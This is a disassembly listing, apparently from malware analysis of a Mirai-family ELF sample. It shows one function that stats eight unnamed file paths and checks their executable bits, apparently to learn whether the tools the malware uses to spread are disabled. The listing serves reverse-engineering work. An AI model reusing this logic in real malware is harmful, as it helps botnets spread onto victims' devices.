
/Users/taogoldi/Projects/Malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

0000000000400c10 <are_infection_tools_disabled>:
  400c10: 41 55                        	push	r13
  400c12: 41 54                        	push	r12
  400c14: 55                           	push	rbp
  400c15: 31 ed                        	xor	ebp, ebp
  400c17: 53                           	push	rbx
  400c18: 31 db                        	xor	ebx, ebx
  400c1a: 48 81 ec d8 00 00 00         	sub	rsp, 0xd8
  400c21: 4c 8d a4 24 90 00 00 00      	lea	r12, [rsp + 0x90]
  400c29: 48 c7 84 24 90 00 00 00 48 4b 41 00  	mov	qword ptr [rsp + 0x90], 0x414b48
  400c35: 48 c7 84 24 98 00 00 00 56 4b 41 00  	mov	qword ptr [rsp + 0x98], 0x414b56
  400c41: 48 c7 84 24 a0 00 00 00 64 4b 41 00  	mov	qword ptr [rsp + 0xa0], 0x414b64
  400c4d: 48 c7 84 24 a8 00 00 00 72 4b 41 00  	mov	qword ptr [rsp + 0xa8], 0x414b72
  400c59: 48 c7 84 24 b0 00 00 00 7f 4b 41 00  	mov	qword ptr [rsp + 0xb0], 0x414b7f
  400c65: 48 c7 84 24 b8 00 00 00 8c 4b 41 00  	mov	qword ptr [rsp + 0xb8], 0x414b8c
  400c71: 48 c7 84 24 c0 00 00 00 98 4b 41 00  	mov	qword ptr [rsp + 0xc0], 0x414b98
  400c7d: 48 c7 84 24 c8 00 00 00 a8 4b 41 00  	mov	qword ptr [rsp + 0xc8], 0x414ba8
  400c89: 66 66 66 90                  	nop
  400c8d: 66 66 90                     	nop
  400c90: 49 8b 3c dc                  	mov	rdi, qword ptr [r12 + 8*rbx]
  400c94: 48 89 e6                     	mov	rsi, rsp
  400c97: e8 e4 6b 00 00               	call	0x407880 <stat64>
  400c9c: 85 c0                        	test	eax, eax
  400c9e: 75 28                        	jne	0x400cc8 <are_infection_tools_disabled+0xb8>
  400ca0: f6 44 24 18 49               	test	byte ptr [rsp + 0x18], 0x49
  400ca5: 74 21                        	je	0x400cc8 <are_infection_tools_disabled+0xb8>
  400ca7: 48 ff c3                     	inc	rbx
  400caa: 48 83 fb 08                  	cmp	rbx, 0x8
  400cae: 66 90                        	nop
  400cb0: 75 de                        	jne	0x400c90 <are_infection_tools_disabled+0x80>
  400cb2: 31 c0                        	xor	eax, eax
  400cb4: 83 fd 08                     	cmp	ebp, 0x8
  400cb7: 0f 94 c0                     	sete	al
  400cba: 48 81 c4 d8 00 00 00         	add	rsp, 0xd8
  400cc1: 5b                           	pop	rbx
  400cc2: 5d                           	pop	rbp
  400cc3: 41 5c                        	pop	r12
  400cc5: 41 5d                        	pop	r13
  400cc7: c3                           	ret
  400cc8: 48 ff c3                     	inc	rbx
  400ccb: ff c5                        	inc	ebp
  400ccd: 48 83 fb 08                  	cmp	rbx, 0x8
  400cd1: 75 bd                        	jne	0x400c90 <are_infection_tools_disabled+0x80>
  400cd3: eb dd                        	jmp	0x400cb2 <are_infection_tools_disabled+0xa2>
  400cd5: 66 66 66 90                  	nop
  400cd9: 66 66 66 90                  	nop
  400cdd: 66 66 90                     	nop
